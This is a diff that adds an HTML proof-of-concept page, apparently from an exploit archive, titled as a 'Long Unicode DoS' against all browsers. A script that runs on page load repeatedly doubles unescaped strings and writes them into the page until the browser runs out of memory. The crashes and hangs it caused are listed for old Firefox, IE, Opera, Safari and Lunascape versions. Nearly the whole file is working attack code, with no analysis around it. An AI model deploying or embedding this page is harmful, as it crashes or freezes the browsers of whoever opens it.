@@ -1,0 +1,41 @@
+<html>
+<title>Dr_IDE - All Browsers - Long Unicode DoS PoC</title>
+<head>
+<script>
+function boom()
+ {
+ //The number of strings increases the amount of memory consumed, quicker crash where applicable.
+	var longunistring1 = unescape("%u4141%u4141");
+	var longunistring2 = unescape("%u4242%u4242");
+	var longunistring3 = unescape("%u4343%u4343");
+	var longunistring4 = unescape("%u4444%u4444");
+	
+	for(i=0; i <= 60 ; ++i) //This number is very sensitive. If you go far over 60 IE won't "work"
+ {
+		longunistring1+=longunistring1;
+		longunistring2+=longunistring2;
+		longunistring3+=longunistring3;
+		longunistring4+=longunistring4;
+		document.write(longunistring1);
+		document.write(longunistring2);
+		document.write(longunistring3);
+		document.write(longunistring4);
+	}     
+	document.write(longunistring1);
+	document.write(longunistring2);
+	document.write(longunistring3);
+	document.write(longunistring4);
+}
+</script>
+</head>
+<body onLoad="boom()">
+<br>Tested on Windows 7:
+<br>Firefox 3.6.4		(CrashReporter)
+<br>IE 8.0.7600.16385 	(Hangs, must quit)
+<br>Lunascape6			(Crashes with Gecko Engine)[Firefox mode]
+<br>Lunascape6			(Crashes with Webkit Engine)[Safari mode] 
+<br>Lunascape6			(Crashes with Trident Engine)[IE mode]
+<br>Opera 10.51			(Hangs, must kill)
+<br>Safari 4.0.5		(Hangs, must kill)
+</body>
+</html>
